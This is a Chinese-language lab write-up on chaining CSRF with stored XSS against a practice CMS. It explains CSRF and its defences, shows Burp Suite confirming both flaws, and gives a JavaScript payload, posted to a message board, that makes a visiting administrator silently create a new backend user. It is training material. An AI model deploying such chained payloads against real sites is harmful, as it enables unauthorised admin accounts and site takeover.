## 实验说明

> 实验环境

- Windows Server 2022
- Kali Linux
- CMS靶场(文章管理系统)

> 实验目标

1. 通过目标的业务流程分析，使用BP验证是否存在漏洞
2. 在存在CSRF和XXS漏洞的目标，结合XSS触发CSRF攻击；完成后台管理账号的创建。



## 相关知识

### CSRF原理

> CSRF原理

攻击者可以伪造当前已经登录的用户的身份访问正常的网站，执行非本意的操作。正常的网站由于没有对来源请求进行一个严格的验证和过滤，导致攻击者可以伪造正常的用户请求，达到攻击目的。

> 漏洞危害

攻击者借用正常用户的身份，发起更改状态的请求，如：银行转账、修改密码、群发消息

---

> 防止 CSRF 攻击，可以采取以下几种防御措施：

1. **同源检测：** 网站可以检测请求的来源是否与自己的域名一致，若不一致则拒绝请求。（验证Referer 字段）
2. **加入随机 Token：** 在每个表单或者请求中加入一个随机生成的 Token，并将该 Token 存储在会话中，当请求发送时，服务器会验证 Token 的有效性，若 Token 不匹配则拒绝请求。Token只会在真正的客户端中有。
3. **使用 Cookie 的 SameSite 属性：** 设置 Cookie 的 SameSite 属性为 Strict 或者 Lax，可以限制 Cookie 在跨站请求时是否发送，从而减少 CSRF 攻击的风险。
4. **二次验证：** 对于一些敏感操作，可以要求用户输入验证码来验证身份，从而增加攻击者的难度。

---



## 实验过程

---

**我们思考，如果一个地方既存在CSRF漏洞，又存在XSS漏洞，那么是否可以结合一下？**

> 1.通过BP我们抓取到用户添加的请求

![image-20240329144717841](https://typora-picgo-push.oss-cn-hangzhou.aliyuncs.com/img-for-typora/image-20240329144717841.png)

> 2.验证是否存在CSRF漏洞
>
> Burp Suite 自带CSRF PoC generator插件，可以根据请求构造表单，进行CSRF 漏洞验证

![image-20240329144940788](https://typora-picgo-push.oss-cn-hangzhou.aliyuncs.com/img-for-typora/image-20240329144940788.png)

针对该请求构造表单并生成网页

![image-20240329145208510](https://typora-picgo-push.oss-cn-hangzhou.aliyuncs.com/img-for-typora/image-20240329145208510.png)

在用户没有退出登录的情况下，访问该网页，如果用户创建成功，则代表有CSRF漏洞

![image-20240329145407358](https://typora-picgo-push.oss-cn-hangzhou.aliyuncs.com/img-for-typora/image-20240329145407358.png)

![image-20240329145430546](https://typora-picgo-push.oss-cn-hangzhou.aliyuncs.com/img-for-typora/image-20240329145430546.png)



创建成功，显然，存在CSRF漏洞；

---

接下来我们尝试寻找XSS漏洞；

1.在留言板处输入js代码，查看是否可以执行

![image-20240329145949105](https://typora-picgo-push.oss-cn-hangzhou.aliyuncs.com/img-for-typora/image-20240329145949105.png)

![image-20240329150006799](https://typora-picgo-push.oss-cn-hangzhou.aliyuncs.com/img-for-typora/image-20240329150006799.png)

我们发现，完全可以执行成功，代表存在XSS漏洞；

----

此时，我们就可以将CSRF和XSS相结合；

通过对用户添加的请求仔细审阅，构建出如下js语句：

```html
<script>
xmlhttp = new XMLHttpRequest();
xmlhttp.open("post","http://192.168.1.8/cms/admin/user.action.php",false);
xmlhttp.setRequestHeader("Content-type","application/x-www-form-urlencoded");
xmlhttp.send("act=add&username=hello&password=111&password2=111&button=%E6%B7%BB%E5%8A%A0%E7%94%A8%E6%88%B7&userid=0");
</script>
```

![image-20240329150322594](https://typora-picgo-push.oss-cn-hangzhou.aliyuncs.com/img-for-typora/image-20240329150322594.png)

当管理员访问留言板时，CSRF被触发；

![image-20240329151140420](https://typora-picgo-push.oss-cn-hangzhou.aliyuncs.com/img-for-typora/image-20240329151140420.png)

可以看到，hello用户被成功创建；

---



















